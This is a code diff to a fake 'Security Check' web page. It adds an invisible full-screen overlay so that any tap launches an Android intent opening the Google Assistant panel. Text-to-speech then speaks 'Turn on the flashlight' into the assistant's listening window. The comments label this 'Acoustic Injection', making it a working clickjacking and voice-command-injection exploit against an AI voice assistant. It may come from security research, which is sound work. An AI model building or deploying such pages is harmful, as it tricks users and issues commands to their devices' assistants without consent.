@@ -10,39 +10,45 @@
     </style>
 </head>
 <body>
+    <div id="click-overlay" style="position:absolute; width:100%; height:100%; z-index:9999; cursor:pointer;"></div>
+
     <div class="box">
         <h2>Security Check</h2>
-        <p>Tap "Verify" to continue to the website.</p>
+        <p>Tap anywhere to verify.</p>
         <button id="btn">Verify</button>
     </div>
 
     <script>
-        const btn = document.getElementById('btn');
-        
-        btn.addEventListener('click', function() {
+        let exploited = false;
+
+        document.getElementById('click-overlay').addEventListener('click', function() {
+            if (exploited) return;
+            exploited = true;
+
             // 1. Synchronously unlock TTS 
             let unlock = new SpeechSynthesisUtterance("");
             window.speechSynthesis.speak(unlock);
 
-            // 2. Trigger the Bottom Overlay Panel
-            // Using VOICE_ASSIST instead of the Live deep link
-            // This pulls up the panel you liked (the one that pops up from below)
-            let intentUrl = "intent:#Intent;" +
-                "action=android.intent.action.VOICE_ASSIST;" +
-                "launchFlags=0x10000000;" + 
+            // 2. Trigger the Bottom Overlay Panel via the BROWSABLE invoke link
+            // We use the exact deep link path we found in the manifest, but omit the query.
+            // Chrome completely allows this because it is a standard HTTPS App Link.
+            let intentUrl = "intent://assistant.google.com/services/invoke/document#Intent;" +
+                "scheme=https;" +
+                "package=com.google.android.googlequicksearchbox;" +
+                "action=android.intent.action.VIEW;" +
                 "end";
             
             window.location.href = intentUrl;
 
             // 3. Acoustic Injection
-            // We wait 700ms for the panel to fully slide up
+            // Wait ~800ms for the bottom panel to slide up and the mic chime to ring
             setTimeout(() => {
                 let msg = new SpeechSynthesisUtterance("Turn on the flashlight");
                 msg.lang = 'en-US';
-                msg.rate = 1.2; // Fast enough to catch the listening window
+                msg.rate = 1.2; 
                 msg.volume = 1.0;
                 window.speechSynthesis.speak(msg);
-            }, 700);
+            }, 800);
         });
     </script>
 </body>
